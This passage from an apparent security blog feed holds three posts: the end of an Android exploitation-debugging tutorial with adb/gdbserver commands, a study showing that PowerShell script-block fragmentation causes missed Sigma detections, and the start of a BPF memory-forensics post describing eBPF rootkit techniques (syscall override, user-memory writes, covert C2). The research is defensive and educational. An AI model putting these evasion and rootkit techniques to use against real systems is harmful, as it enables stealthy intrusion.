art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeVirtual 0x000071636e16e306 mterp_op_invoke_virtual 0x000071636db7e71a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeVirtual 0x000071636e16e306 mterp_op_invoke_virtual 0x000071636db7e71a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e MterpInvokeInterface 0x000071636e175bfd mterp_op_invoke_interface 0x000071636db7e91a art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94b43 artQuickToInterpreterBridge 0x000071636e159a70 art_quick_to_interpreter_bridge 0x000071636dba04bd \u0026lt;unknown\u0026gt; 0x000071636dba07c0 This is a stack - trace of a module that will be exploited in a later post. The most important address is the return address of Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper, i.e the address into art_quick_generic_jni_trampoline: 0x000071636dba032c. Depending on whether the native method is e.g. declared as static or not, different stubs are called, which may result in different return addresses. Thus it might be beneficial to produce a small sample app with the same setup as the target app, especially w.r.t. access modifiers etc. of the native method, to get an idea of the stack - trace.\nDebugging on Android Another very important aspect of binary exploitation is debugging. There are a lot of good resources out there (like 1 , 2 ). One possible debugger is GDB . As GDB by itself is pretty hard to use, I will use an extensions in this series, called GEF . A prerequisite is that we have root access on the device/emulator.\nStarting an app from terminal In order to debug an app, the app needs to run. In this case, as we are using a \u0026ldquo;special\u0026rdquo; app, we just need to run it without waiting for a debugger to attach. Running an app can be done as follows:\n$ adb shell \u0026#34;am start -n com.damnvulnerableapp/com.damnvulnerableapp.managerservice.ManagerActivity\u0026#34; Here we assume that the app of choice is the DamnVulnerableApp, which is the main focus of this series.\nFrom here onwards, the manager will run in the background and wait for incoming connections. Once a connection is established, the messages will be used to tell the manager what to do, like spawning a vulnerable module.\nStarting an exploit script Assuming that connecting to a socket server is not a great challenge, right after the connection has been established and a vulnerable module selected, the exploit script should wait for the debugger to attach. This can be achieved like demonstrated in the following:\n# Need tcp forward, i.e. \u0026#39;adb forward tcp:8080 tcp:8080\u0026#39; client = PwnClient(\u0026#39;127.0.0.1\u0026#39;, 8080) client.select(\u0026#39;EasyStackBufferOverflowModule\u0026#39;) print(client.fetch()) input(\u0026#39;Press \u0026lt;enter\u0026gt; to continue...\u0026#39;) ... This is not the clean way, but it works just fine.\nAttaching gdb Notice that selecting a module should spawn a new process that encapsulates the vulnerable module. Now we need a gdbserver, which is part of the Android NDK . Uploading the gdbserver to e.g. /data/local/tmp/gdbserver will enable us to attach to running processes. The command history could look like this:\n$ adb push gdbserver /data/local/tmp/gdbserver $ adb shell \u0026#34;chmod 777 /data/local/tmp/gdbserver\u0026#34; $ adb forward tcp:1337 tcp:1337 $ adb shell \u0026#34;/data/local/tmp/gdbserver :1337 --attach $(pidof com.damnvulnerableapp:VulnerableActivity)\u0026#34; ... Listening on port 1337 We will make gdb connect to port 1337 for debugging. After the last command, the process will block until a debugger connects. Before that, we should provide gdb with all necessary symbol information that is helpful for debugging. Namely (inspired from here ):\n$ mkdir ~/dbgtmp $ adb pull /system/lib64 ~/dbgtmp $ mkdir ~/dbgtmp/tmp $ adb pull /apex/com.android.art/lib64 ~/dbgtmp/tmp $ mv ~/dbgtmp/tmp/* ~/dbgtmp/lib64 $ cp ~/path/to/unpacked/apk/lib/x86_64/* ~/dbgtmp/lib64 Then, in gdb/gef (taken from here and here ):\ngef➤ set solib-absolute-prefix ~/dbgtmp/ gef➤ set solib-search-path ~/dbgtmp/lib64/ gef➤ gef-remote :1337 ... [+] Connected to \u0026#39;:1337\u0026#39; [+] Remote information loaded to temporary path \u0026#39;/tmp/gef/6695\u0026#39; gef➤ sharedlibrary ... The last command will take ages to run, but its worth as we get access to almost all symbols we need (there is most likely a better way to do this). Basically we just need to do this once with all the libraries, then identify the libraries we are interested in and create a directory next to lib64 on our local machine that only contains this interesting subset of the shared - object files. This will speed up loading time by a lot!\nSummary We have seen some security mechanisms that will make the life of an attacker harder. Depending on the assumptions, like e.g. leaking an address, some mechanisms can be rendered useless. Also, we are now able to get limited source code access and debug Android apps using gdb. This will allow us to exploit the available modules in damnvulnerableapp.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_1/","tags":["Android","Binary Exploitation","JNI","E²VA"],"title":"E²VA: Android Basics (Part 2)"},{"categories":null,"content":"PowerView is evil, but PowerVi and ew are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation TL;DR: Sigma rules and similar signature-based threat detection measures may miss malicious PowerShell scripts due to unpredictable fragmentation of script block logs.\nIntroduction Sigma offers more than 3000 rules for signature-based threat detection. 140 of these rules aim to detect suspicious/malicious PowerShell scripts by looking into PowerShell script block logs. Fragmentation of script blocks during Script Block Logging results in varying number of alerts when loading the same script multiple times. On the one hand, there is a trend of more alerts being generated when the script is split into more fragments (which is fine), but on the other hand, the fragmentation of scripts into blocks may result in missed detections.\nI know this is a lot, but bear with me as I tell you the whole story. If you are only interested in the juicy part, you can skip to \u0026lsquo;The case of split \u0026ldquo;PowerVi/ew\u0026rdquo;\u0026rsquo;.\nThe Uncertainty of Script Block Logging It is known that when loading a very large script, PowerShell breaks it into multiple parts before logging them - sometimes resulting in dozens of fragments. To illustrate this behavior, we loaded the well-known PowerView script a total of 10 times (on the same machine and configuration) and recorded into how many block fragments it was broken. The results are shown in the table below.\nRun 1 2 3 4 5 6 7 8 9 10 # Blocks 54 76 57 49 64 57 55 69 39 47 We can see that the number of blocks ranges from 39 to 76, which is quite a significant difference.\nMore script blocks -\u0026gt; More alerts? Now, when using Sigma rules that operate on single logged ScriptBlockTexts, the number of generated alerts might differ because the number of logged blocks differs. More specific, the number of generated alerts usually increases with increasing number of blocks, because the malicious/suspicious strings were found in more blocks. Using \u0026ldquo;all rules\u0026rdquo; from Sigma release r2024-03-11 and the 10 recorded PowerView loadings, the following number of alerts were generated using Chainsaw (sorted by number of blocks).\nBlocks 39 47 49 54 55 57 57 64 69 76 Alarms 79 91 94 103 99 106 107 110 119 126 \u0026hellip; raised on \u0026hellip; blocks 39 46 48 53 53 56 56 60 65 70 Here, we see that the number of alarms usually increases with the number of blocks - that is the expected behavior. The only run that does not match this trend is the one that generated 55 script blocks. Here, less alerts are generated than in the run generating 54 script blocks. Although this behavior leads to inconsistency, it can be considered \u0026ldquo;not too bad\u0026rdquo; since in some cases more alerts are generated than in other cases, but overall we still catch everything, right?\nMore script blocks -\u0026gt; Less alerts?? To investigate how the number of blocks influences the number of generated alerts, we further looked into the generated alarms. Below, the number of generated alerts for each triggered rule is listed for each of the 10 runs.\nRule / Run#Blocks 9#39 10#47 4#49 1#54 7#55 3#57 6#57 5#64 8#69 2#76 AVG Total 79 91 94 103 99 106 107 110 119 126 103.4 Execute Invoke-command on Remote Host 5 6 6 6 6 7 6 [2] 7 7 7 6.3 Malicious PowerShell Commandlets - ScriptBlock 35 42 43 49 46 51 51 53 58 61 48.9 Malicious PowerShell Keywords 3 2 2 2 2 2 3 2 3 2 2.3 Manipulation of User Computer or Group Security Principals Across AD 4 4 4 6 [3] 4 4 4 4 4 \u0026lt;5\u0026gt; 4.3 Potential In-Memory Execution Using Reflection.Assembly 1 1 1 1 1 1 1 1 1 1 1 Potential Suspicious PowerShell Keywords 1 [1] 2 2 2 2 2 2 2 2 2 1.9 PowerView PowerShell Cmdlets - ScriptBlock 27 30 32 34 35 35 36 38 40 45 35.2 Request A Single Ticket via PowerShell 1 1 1 1 1 1 1 1 \u0026lt;2\u0026gt; +1 because of script block cut-off 1 1.1 Usage Of Web Request Commands And Cmdlets - ScriptBlock 1 1 1 1 1 1 1 1 1 1 1 First, let\u0026rsquo;s look at some results that were expected.\n[1] Potential Suspicious PowerShell Keywords: When having only 39 script block fragments, only 1 alarm is generated because all the \u0026ldquo;suspicious\u0026rdquo; strings fitted into the first block - because it is larger compared to the other cases.\n[2] Execute Invoke-command on Remote Host: Goes from 5 to 7 raised alerts - increasing with the number of blocks because the search strings are found in more blocks. Only run 6 with 57 blocks is an outlier, producing less alerts than run 3 with the same amount of 57 blocks. This is getting suspicious..\n[3] Manipulation of User Computer or Group Security Principals Across AD: In all but two runs exactly 4 alarms are generated. The run that raised 5 alarms was the one with the largest number of blocks - so this behavior is expected - but the one with the most alarms (6) only created 54 blocks. Further investigation showed that this is the result of the \u0026ldquo;random\u0026rdquo; script fragmentation, where all 6 \u0026ldquo;suspicious\u0026rdquo; strings were found in 6 different blocks, where in the other runs multiple strings where found in a single block resulting in less alerts.\nOkay, so these results are kind of expected and not too bad. So we should be fine, right?\nWell, when investigating the results of the rule Malicious PowerShell Commandlets - ScriptBlock , a case came true that we thought was extremely unlikely.\nThe case of split \u0026ldquo;PowerVi/ew\u0026rdquo; Among others, the rule Malicious PowerShell Commandlets - ScriptBlock , detects the string \u0026ldquo;PowerView\u0026rdquo; inside script blocks. Now, comparing two different runs, run3 with 57 blocks generated 51 alerts and run2 with 76 blocks generated 61 alerts for this rule. So more blocks -\u0026gt; more alerts, this is fine. But, looking deeper into the script blocks and generated alerts, we noticed something at the end of script block 38 of 57 of run 3.\nAdd-Member Noteproperty \u0026#39;Comment\u0026#39; $Info.lgrpi1_comment\\n $LocalGroup.PSObject.TypeNames.Insert(0, \u0026#39;PowerVi And the beginning of script block 39 of 57:\new.LocalGroup.API\u0026#39;)\\n So, in this case the PowerView script was fragmented in such a way, that a string that should have been detected was no longer detected, i.e., \u0026ldquo;PowerView\u0026rdquo; was split into \u0026ldquo;PowerVi\u0026rdquo; and \u0026ldquo;ew\u0026rdquo;. (To be fair, script block 38 still raised an alarm because the string \u0026ldquo;PowerView\u0026rdquo; occures in it multiple times, but still this example illustrates the problem at hand.)\nLosing alerts This shows, that depending on the fragmentation of script blocks, we can indeed lose alerts and miss contents of scripts that should be detected, e.g., by strings split into two parts in two different blocks. But there are other cases: Rules like Execute Invoke-command on Remote Host detect multiple strings in a single script block (ScriptBlockText|contains|all). Now, when one of those strings is randomly put into a different block, the rule no longer triggers. Although this case should be more likely than the case of \u0026ldquo;search strings split in two\u0026rdquo;, the 10 simulations did not result in such a case since the number of alerts for this specific rule is much smaller (only 5-7 alarms compared to 35-61 for \u0026ldquo;Malicious PowerShell Commandlets - ScriptBlock\u0026rdquo;).\nConclusion We learned that loading the PowerView script multiple times results in fragmentations of it ranging from 39 to 76 blocks. The alerts raised on these script blocks showed the trend of increasing number of alerts with increasing number of script blocks. Although this behavior adds uncertainty to the generation of alerts, it is of no critical nature. But, another example showed, that the fragmentation of scripts into blocks might result in suspicious/malicious strings being split into two blocks, resulting in a case where the search strings could not be found and the detection is completely missed. Furthermore, when searching for multiple strings in a single block, the fragmentation of scripts might result in these strings being split into two different blocks - where detection is also no longer possible.\nIs there a remedy? Maybe re-combining script fragments (like this ) to run detection mechanisms on the reconstructed scripts?\nSidenote: To add, this behavior might also be leveraged by malicious actors to avoid detection\u0026hellip;\nThe described findings were observed on a Windows 10 host with PowerShell Version 5.1 and PowerShell logging configurations according to the recommendations by the Australian Cyber Security Centre (ACSC) which include PowerShell Module and PowerShell Script Block Logging.\n","permalink":"https://lolcads.github.io/posts/2024/04/psscriptblockfragmentation/","tags":["SIEM","ThreatDetection","Sigma","PowerShell","ScriptBlockLogging","Forensics"],"title":"*PowerView* is evil, but *PowerVi* and *ew* are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation"},{"categories":null,"content":"BPF Memory Forensics with Volatility 3 Introduction and Motivation Have you ever wondered how an eBPF rootkit looks like? Well, here\u0026rsquo;s one, have a good look:\nUpon receiving a command and control (C2) request, this specimen can execute arbitrary commands on the infected machine, exfiltrate sensitive files, perform passive and active network discovery scans (like nmap), or provide a privilege escalation backdoor to a local shell. Of course, it\u0026rsquo;s also trying its best to hide itself from system administrators hunting it with different command line tools such as ps, lsof, tcpdump an others or even try tools like rkhunter or chkrootkit.\nWell, you say, rootkits have been doing that for more than 20 years now, so what\u0026rsquo;s the news here? The news aren\u0026rsquo;t that much the features, but rather how they are implemented. Everything is realized using a relatively new and rapidly evolving kernel feature: eBPF. Even though it has been in the kernel for almost 10 years now, we\u0026rsquo;re regularly surprised by how many experienced Linux professionals are still unaware of its existence, not even to mention its potential for abuse.\nThe above picture was generated from the memory image of a system infected with ebpfkit , an open-source PoC rootkit from 2021, using a plugin for the Volatility 3 memory forensics framework. In this blog post, we will present a total of seven plugins that, taken together, facilitate an in depth analysis of the state of the BPF subsystem.\nWe structured this post as follows: The next section provides an introduction to the BPF subsystem, while the third section highlights its potential for (ab)use by malware. In section four, we will introduce seven Volatility 3 plugins that facilitate the examination of BPF malware. Section five presents a case study, followed by a section describing our testing and evaluation of the plugins on various Linux distributions. In the last section, we conclude with a discussion of the steps that are necessary to integrate our work into the upstream Volatility project, other challenges we encountered, and open research questions.\nNote: The words \u0026ldquo;eBPF\u0026rdquo; and \u0026ldquo;BPF\u0026rdquo; will be used interchangeably throughout this post.\nThe BPF Subsystem Before delving into the complexities of memory forensics, it is necessary to establish some basics about the BPF subsystem. Readers that are already familiar with the topic can safely skip this section.\nTo us, BPF is first of all an instruction set architecture (ISA). It has ten general purpose registers, which are 64 bit wide, and there are all of the basic operations that you would expect a modern ISA to have. Its creator, Alexei Starovoitov, once described it as a kind of simplified x86-64 and would probably never have imagined that the ISA he cooked up back in 2014 would once enter a standardization process at the IETF. The interested reader can find the current proposed standard here . Of course, there are all the other things that you would expect to come with an ISA, like an ABI that defines the calling convention, and a binary encoding that maps instructions to sequences of four or eight bytes.\nThe BPF ISA is used as a compilation target (currently by clang - gcc support is on the way) for programs written in high-level languages (currently C and Rust), however, it is not meant to be implemented in hardware. Therefore, it is conceptually more similar to WebAssembly or Java Bytecode than x86-64 or arm64, i.e., BPF programs are meant to be executed by a runtime that implements the BPF virtual machine (VM). Several BPF runtimes exist, but the \u0026ldquo;reference implementation” is in the Linux kernel.\nRuntimes are, of course, free to choose how they implement the BPF VM. The instruction set was defined in a way that makes it easy to implement a one-to-one just in time (JIT) compiler for many CPU architectures. In fact, in the Linux kernel, even non-mainstream architectures like powerpc, sparc or s390 have BPF JITs. However, the kernel also has an interpreter to run BPF programs on architectures that do not yet support JIT compilation.\nAside: The BPF platform is what some call a \u0026ldquo;verified target\u0026rdquo;. This means that in order for a program to be valid it has to have some \u0026ldquo;non-local\u0026rdquo; properties. Those include the absence of (unbounded) loops, registers and memory can only be read after they have been written to, the stack depth may not exceed a hard limit, and many more. The interested reader can find a more exhaustive description here . In practice, runtime implementations include an up-front static verification stage and refuse to execute programs that cannot be proven to meet these requirements (some runtime checks may be inserted to account for the known shortcomings of static analysis). This static verification approach is at the hearth of BPF\u0026rsquo;s sandboxing model for untrusted code.\nRoughly speaking, the BPF subsystem includes, besides the implementation of the BPF VM, a user and kernel space interface for managing the program life cycle as well as infrastructure for transitioning the kernel control flow in and out of programs running inside the VM. Other subsystems can be made \u0026ldquo;programmable\u0026rdquo; by integrating the BPF VM in places where they want to allow the calling of user-defined functions, e.g., for decision making based on their return value. The networking subsystem, for example, supports handing all incoming and outgoing packets on an interface to a BPF program. Those programs can freely rewrite the packet buffer or even decide to drop the packet all together. Another example is the tracing subsystem that supports transitioning control into BPF programs at essentially any instruction via one of the various ways it has to hook into the kernel and user space execution. The final example here is the Linux Security Module (LSM) subsystem that supports calling out to BPF programs at any of its security hooks placed at handpicked choke points in the kernel. There are many more examples of BPF usage in the kernel and even more in academic research papers and patches on the mailing list, but we guess we conveyed the general idea.\nBPF programs can interact with the world outside of the VM via so called helpers or kfuncs, i.e., native kernel functions that can be called by BPF programs. Services provided by these functions range from getting a timestamp to sending a signal to the current task or reading arbitrary memory. Which functions a program can call depends on the program type that was selected when loading it into the VM. When reversing BPF programs, looking for calls to interesting kernel functions is a good point to start.\nThe second ingredient you need in order to get any real work done with a BPF program are maps. While programs can store data during their execution using stack memory or by allocating objects on the heap, the only way to persist data across executions of the same program are maps. Maps are mutable persistent key value stores that can be accessed by BPF programs and user space alike, as such they can be used for user-to-BPF, BPF-to-user, or BPF-to-BPF communication, where in the last case the communicating programs may be different or the same program at different times.\nAnother relevant aspect of the BPF ecosystem is the promise of compile once run everywhere (CORE), i.e., a (compiled) BPF program can be run inside of a wide range of Linux kernels that might have different configurations, versions, compilers, and even CPU architectures. This is achieved by having the compiler emit special relocation entries that are processed by a user-space loader prior to loading a program into the kernel\u0026rsquo;s BPF VM. The key ingredient that enables this approach is a self-description of the running kernel in the form of BPF Type Format (BTF) information, which is made available in special files under /sys/kernel/btf/. For example, BPF source code might do something like current-\u0026gt;comm to access the name of the process in whose context the program is running. This might generate an assembly instruction that adds the offset of the comm field to a pointer to the task descriptor that is stored in a register, i.e., ADD R5, IMM. However, the immediate offset might vary due to kernel version, configuration, structure layout randomization or CPU architecture. Thus, the compiler would emit a relocation entry that tells the user-space loader running on the target system to check the kernel\u0026rsquo;s BTF information in order to overwrite the placeholder with the correct offset. Together with other kinds of relocations, which address things like existence of types and enum variants or their sizes, the loader be used to run the same BPF program on a considerable number of kernels.\nAside: A problem with the CORE implementation described above is that signatures over BPF programs are meaningless as the program text will be altered by relocations before loading. To allow for a meaningful ahead of time signature there is another approach in which a loader program is generated for the actual program. The loader program is portable without relocations and is signed and loaded together with the un-relocated bytecode of the actual program. Thus, the problem is solved as all text relocations happen in the kernel, i.e., after signatures have been verified.\nHowever, there are of course limits to the portability of BPF programs. As we all know, the kernel takes great care to never break user space, within kernel land, on the other hand, there are no stability guarantees at all. BPF programs are not considered to be part of user space and thus there are no forward or backward compatibility guarantees. In practice, that means that APIs exposed to BPF could be removed or changed, attachment points could vanish or change their signature, or programs that are currently accepted by the static verifier could be rejected in the future. Furthermore, changes in kernel configuration could remove structure fields, functions, or kernel APIs that programs rely on. In that sense, BPF programs are in a position similar to out-of-tree kernel modules. That being said, due to CORE, there is no need to have the headers of the target kernel available at compile time and thus a lot less knowledge about the target is needed to be confident that the program will be able to run successfully. Furthermore, in the worst case the program will be rejected by the kernel, but there are no negative implications on system stability by attempting to load it.\nFinally, we should mention that BPF is an entirely privileged interface. There are multiple BPF-related capabilities that a process can have, which open up various parts of the subsystem. This has not always been the case. A few years ago, unprivileged users were able to load certain types of BPF programs, however, access to the BPF VM comes with two potential security problems. First, the security entirely relies on the correctness of the static verification stage, which is notoriously complex and must keep up with the ever-expanding feature set. It has been demonstrated that errors in the verification process can be exploited for local privilege escalation, e.g., CVE-2020-8835 or CVE-2021-3490 . Second, even within the boundaries set by the verifier, the far-reaching control over the CPU instructions that get executed in kernel mode opens up the door for Spectre attacks, c.f., Jann Horn\u0026rsquo;s writeup or the original Spectre paper . For those reasons, the kernel community has decided to remove unprivileged access to BPF by default .\nBPF Malware To better understand the implications the addition of the BPF VM has for the Linux malware landscape, we would like to start with a quote from \u0026ldquo;BPF inventor\u0026rdquo; Alexei Starovoitov: \u0026ldquo;If in the past the whole kernel would maybe be [a] hundred of programmers across the world, now a hundred thousand people around the world can program the kernel thanks to BPF.\u0026rdquo;, i.e., BPF significantly lowers the entry barrier to kernel programming and shipping applications that include kernel-level code. While the majority of new kernel programmers are well-intentioned and aim to develop innovative and useful applications, experience has shown that there will be some actors who seek to use new kernel features for malicious purposes.\nFrom a malware author\u0026rsquo;s perspective, one of the first questions is probably how likely it is that a target system will support the loading of malicious BPF programs. According to our personal experience it is safe to say that most general-purpose desktop and server distributions enable BPF. The feature is also enabled in the android-base.config as BPF plays a significant role in the Android OS, i.e., essentially every Android device should support BPF - from your fridge to your phone. Concerning the custom kernels used by big tech companies let me quote Brendan Gregg, another early BPF advocate: \u0026ldquo;As companies use more and more eBPF also, it becomes harder for your operating system to not have eBPF because you are no longer eligible to run workloads at Netflix or at Meta or at other companies.\u0026rdquo;. What is more, Google relies on BPF (through cilium ) in its Kubernetes engine and Facebook uses it for its layer 4 load balancer katran . For a more comprehensive survey of BPF usage in cloud environments we recommend section 5 of Cross Container Attacks: The Bewildered eBPF on Clouds by Yi He et al. Thus, most of the machines that constitute \u0026ldquo;the cloud\u0026rdquo; are likely to support BPF. This is particularly interesting as signature verification for BPF programs is still not available, making it the only way to run kernel code on locked-down systems that restrict the use of kernel modules.\nHowever, enabling the BPF subsystem, i.e., CONFIG_BPF, is only the beginning of the story. There are many compile-time or run-time configuration choices that affect the capabilities granted to BPF programs, and thus the ways in which they can be used to subvert the security of a system. Giving a full overview of all the available switches and their effect would exceed the scope of this post, however, we will mention some knobs that can be turned to stop the abuses mentioned below.\nIf you search for the term “BPF malware” these days, you will find rather sensational articles with titles like \u0026ldquo;eBPF: A new frontier for malware\u0026rdquo;, \u0026ldquo;How BPF-Enabled Malware Works\u0026rdquo;, \u0026ldquo;eBPF Offensive Capabilities – Get Ready for Next-gen Malware\u0026rdquo;, \u0026ldquo;Nothing is Safe Anymore - Beware of the “eBPF Trojan Horse” or \u0026ldquo;HOW DOES EBPF MALWARE PERFORM AGAINST STAR LAB’S KEVLAR EMBEDDED SECURITY?\u0026rdquo;. Needless to say, that they contain hardly any useful information. The truth is that we are not aware of any reports of in-the-wild malware using BPF. Nevertheless, there is no shortage in open source PoC BPF malwares on GitHub. The two biggest ones are probably ebpfkit and TripeCross , however, there are many smaller projects like nysm , sshd_backdoor , boopkit , pamspy , or bad bpf as well as snippet collections like nccgroup\u0026rsquo;s bpf tools , Offensive-BPF . Researchers also used malicious BPF programs to escape container isolation in multiple real-world cloud environments.\nThere are a couple of core shenanigans that those malwares are constructed around, three of which we will briefly describe here.\nIt is possible to transparently (for user space) skip the execution of any system call or to manipulate just the return value after it was executed. This is since BPF can be used for the purpose of error injection . To be precise, any function that is annotated with the ALLOW_ERROR_INJECTION macro can be manipulated in this way, and every system call is automatically annotated via the macro that defines it. One would hope that the corresponding configurations BPF_KPROBE_OVERRIDE and CONFIG_FUNCTION_ERROR_INJECTION would not be enabled in kernels shipped to end users, but they are. There are many things that one can do by lying to user space in this way, one example would be to block the sending of all signals to a specific process, e.g., to protect it from being killed . Interestingly, the same helper is also used by BPF-based security solutions like tetragon , which are deployed in production cloud environments.\nAnother common primitive is to write to memory of the current process, which gives attackers the power to perform all sorts of interesting memory corruptions. One of the more original ideas is to inject code into a process by writing a ROP chain onto its stack. The chain sets up everything to load a shared library and cleanly resumes the process afterwards. More generally, the helper bpf_probe_write_user is involved in many techniques to hide objects, e.g., sockets or BPF programs, from user space or when manipulating apparent file and directory contents, e.g., /proc, /etc/sudoers or ~/.ssh/authorized_keys. In particular, those apparent modifications cannot be caught with file system forensics as they are only happening in the memory of the process that attempts to access the resource, e.g., see textreplace for an example that allows arbitrary apparent modifications of file contents. While there are in fact a couple of legitimate programs (like the Datadog-agent ) using this function, it is probably wise to enable CONFIG_LOCK_DOWN_KERNEL_FORCE_INTEGRITY before compilation.\nA rather peculiar aspect of BPF malware is how it communicates over the network. BPF programs are not able to initiate network connections by themselves, but as one of the main applications of BPF is in the networking subsystem, they have far-reaching capabilities when it comes to managing existing traffic. For example, XDP programs get their hands on packets very early in the receive path, long before mechanisms like netfilter, which is much further up the network stack, get a chance to see them. In fact, there are high-end NICs that support running BPF programs on the device\u0026rsquo;s proces rather than the host CPU. Furthermore, programs that handle packets can usually modify, reroute, or drop them. In combination, this is often used to receive C2 commands while at the same time hiding the corresponding packets from the rest of the kernel by modifying or dropping them. In addition, BPF\u0026rsquo;s easy programmability makes it simple to implement complex, stateful triggers. To exfiltrate data from the system, the contents, and potentially also the recipient data, of outgoing packets are modified, for example by traffic control (tc) hooks. For unreliable transport protocols higher layers will deal with the induced packet loss, while for TCP the retransmission mechanism ensures that applications will not be impacted. Turn off CONFIG_NET_CLS_BPF and CONFIG_NET_ACT_BPF to disable tc BPF programs.\nWhile the currently charted BPF malware landscape is limited to hobby projects by security researchers and other interested individuals, it would unfortunately not be unheard of that the same projects are eventually discovered during real-world incidents. Advanced Linux malwares, on the other hand, will most likely choose to implement their own BPF programs when they believe that it is beneficial for their cause, for instance to avoid detection by using a mechanism that is not yet well known to the forensic community. Some excerpts from the recent talk by Kris Nova at DevOpsDays Kyiv give an interesting insight into the concerns that the Ukrainian computer security community had, and still has, regarding the use of BPF in Russian attacks on their systems.\nIt would be dishonest to claim that there is a general schema that you can follow while analyzing an incident to discover all malicious BPF programs. As so often, the boundaries between monitoring software, live patches, security solutions and malware are not clearly defined, e.g., in addition to bpf_override_retun tetragon also uses bpf_send_singal. The first step could be to obtain a baseline of expected BPF-related activity, and carefully analyze any deviations or anomalies. Additionally, a look at the kernel configuration can help to decide which kinds of malicious activity are fundamentally possible. Furthermore, programs that make use of possibly malicious helper functions, like bpf_probe_wite_user, bpf_send_signal, bpf_override_return, or bpf_skb_store_bytes should be reverse engineered with particular scrutiny. In addition, there are some clear indicators of malicious activity, like the hiding of programs, which we will discuss in more detail below. Finally, once program signatures are upstreamed, it is highly recommended to enable and enforce them to lock down this attack surface.\nFrom now on, we will shift gears and focus on the main topic of this post, hunting BPF malware in main memory images.\nAside: The bvp47 , Symbiote and BPFdoor rootkits are often said to be examples of BPF malware. However, they are using only what is now known as classic BPF, i.e., the old-school packet filtering programs used by programs like tcpdump.\nVolatility Plugins Volatility is a memory forensics framework that can be used to analyze physical memory images. It uses information about symbols and types of the operating system that was running on the imaged system to recover high-level information, like the list of running processes or open files, from the raw memory image.\nIndividual analyses are implemented as plugins that make use of the framework library as well as other plugins. Some of those plugins are closely modeled after core unix utilities, like the ps utility for listing processes, the ss utility for listing network connections or the lsmod utility for listing kernel modules. Other plugins implement checks that search for common traces of kernel rootkit activity, like the replacement of function pointers or inline hooks.\nThere may be multiple ways to obtain the same piece of information, and thus multiple plugins that, on first sight, serve the same purpose. Inconsistencies between the methods, however, could indicate malicious activity that tries to hide its presence or just be artifacts of imperfections in the acquisition process. In any case, inconsistencies are something an investigator should look into.\nIn this section we present seven Volatility plugins that we have developed to enable analysis of the BPF subsystem. Three of these are modelled after subcommands of the bpftool utility and provide basic functionality. We then present three plugins that retrieve similar information from other sources and can thus be used to detect inconsistencies. Finally, we present a plugin that aggregates information from four other plugins to make it easier to interpret.\n_Note: We published the source code for all of our plugins on GitHub . We would love to see your contributions there! :)\nListing Programs, Maps \u0026amp; Links Arguably the most basic task that you could think of is simply listing the programs that have been loaded into the BPF VM. We will start by doing this on a live system, feel free to follow along in order to discover what your distribution or additional packages that you installed have already loaded.\nLive System The bpftool user-space utility allows admins to interact with the BPF subsystem. One of the most basic tasks it supports is the listing of all loaded BPF programs, maps, BTF sections, or links. We are sometimes going to refer to these things collectively as BPF objects. Roughly speaking, links are a mechanism to connect a loaded program to a point where it is being invoked, and BTF is a condensed form of DWARF debug information.\nLets start with an example to get familiar with the information that is displayed (run btftool as root):\n# bpftool prog list [...] 22: lsm name restrict_filesystems tag 713a545fe0530ce7 gpl loaded_at 2023-11-26T10:31:42+0100 uid 0 xlated 560B jited 305B memlock 4096B map_ids 13 btf_id 53 [...] From left-to-right and top-to-bottom we have: ID used as an identifier for user-space, program type, program name, tag that is a SHA1 hash over the bytecode, license, program load timestamp, uid of process that loaded it, size of the bytecode, size of the jited code, memory blocked by the program, ids of the maps that the program is using, ids to the BTF information for the program.\nWe can also inspect the bytecode\n# bpftool prog dump xlated id 22 int restrict_filesystems(unsigned long long * ctx): ; int BPF_PROG(restrict_filesystems, struct file *file, int ret) 0: (79) r3 = *(u64 *)(r1 +0) 1: (79) r0 = *(u64 *)(r1 +8) 2: (b7) r1 = 0 [...] where each line is the pseudocode of a BPF assembly instruction and we even have line info, which is also stored in the attached BTF information. We can also dump the jited version and confirm that is is essentially a one-to-one translation to x86_64 machine code (depending on the architecture your kernel runs on):\n# bpftool prog dump jited id 22 int restrict_filesystems(unsigned long long * ctx): bpf_prog_713a545fe0530ce7_restrict_filesystems: ; int BPF_PROG(restrict_filesystems, struct file *file, int ret) 0:\tendbr64 4:\tnopl\t(%rax,%rax) 9:\tnop b:\tpushq\t%rbp c:\tmovq\t%rsp, %rbp f:\tendbr64 13:\tsubq\t$24, %rsp 1a:\tpushq\t%rbx 1b:\tpushq\t%r13 1d:\tmovq\t(%rdi), %rdx 21:\tmovq\t8(%rdi), %rax 25:\txorl\t%edi, %edi [...] Furthermore, we can display basic information about the maps used by the program\n# bpftool map list id 13 13: hash_of_maps name cgroup_hash flags 0x0 key 8B value 4B max_entries 2048 memlock 165920B as well as their contents (which are quite boring in this case).\n# bpftool map dump id 13 Found 0 elements We can also get information about the variables and types (BTF) defined in the program. This is somewhat comparable to the DWARF debug information that comes with some binaries - just that it is 